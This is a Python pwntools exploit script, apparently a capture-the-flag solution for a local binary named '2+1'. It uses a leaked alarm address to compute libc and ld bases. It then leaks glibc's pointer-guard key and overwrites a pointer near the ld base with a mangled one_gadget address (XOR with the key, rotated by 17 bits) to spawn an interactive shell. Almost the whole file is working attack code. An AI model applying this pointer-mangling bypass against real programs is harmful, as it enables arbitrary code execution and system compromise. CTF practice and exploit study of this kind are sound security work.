#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

p = process('./2+1')


def ROR(num, index):
  tmp = bin(num)[2:].rjust(64, "0")
  for _ in range(index):
      tmp = tmp[-1] + tmp[:-1]  # 取最后一位 取从第1位到最后一位前一位，拼接起来。相当于右移了一位。
  return int(tmp, 2)


def ROL(num, index):
  tmp = bin(num)[2:].rjust(64, "0")
  for _ in range(index):
      tmp = tmp[1:] + tmp[0]
  return int(tmp, 2)


if __name__ == "__main__":
  gdb.attach(p, 'b *$rebase(0x1285)\n')

  p.recvuntil('Gift: ')
  alarm = int(p.recv(14), 16)
  libc = alarm - 0x0cc200
  success('ALARM:\t' + str(hex(alarm)))
  success('LIBC :\t' + str(hex(libc)))
  success('LD   :\t' + str(hex(alarm + 0x517500)))

  p.sendafter('where to read?:', p64(alarm + 0x523a70))
  p.recvuntil('data: ')
  key = u64(p.recv(8))
  success('KEY:\t' + str(hex(key)))
  p.sendafter('where to write?:', p64(alarm + 0x517500 - 64))

  res = ROL(((libc + 0x4526a) ^ key), 17)
  success('RES:\t' + str(hex(res)))
  p.sendlineafter('msg: ', p64(res))  # ror 0x11 ;  xor rax, key
  p.interactive()
